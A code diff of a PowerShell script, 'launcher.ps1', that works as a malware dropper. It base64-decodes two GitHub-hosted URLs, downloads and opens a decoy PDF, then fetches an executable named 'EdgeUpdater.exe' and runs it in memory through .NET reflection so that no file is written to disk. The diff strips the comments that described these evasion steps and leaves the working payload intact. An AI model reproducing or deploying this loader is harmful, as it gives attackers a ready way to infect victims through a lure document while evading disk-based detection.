@@ -1,20 +1,15 @@
-# launcher.ps1 - Memory-only execution (no file on disk)
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Decoy PDF (still written to disk – acceptable)
 $pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
 $tempDir = $env:TEMP
 $pdfPath = "$tempDir\nakaz.pdf"
 
-# Download PDF (written to disk – fine)
 Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
 Start-Process $pdfPath
 
-# Download EXE as bytes (never written to disk)
 $exeBytes = (Invoke-WebRequest -Uri $exeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content
 
-# Load and execute the EXE in memory (for .NET executables)
 $assembly = [System.Reflection.Assembly]::Load($exeBytes)
 $entryPoint = $assembly.EntryPoint
-$entryPoint.Invoke($null, (, [string[]] @()))  # No arguments
+$entryPoint.Invoke($null, (, [string[]] @()))
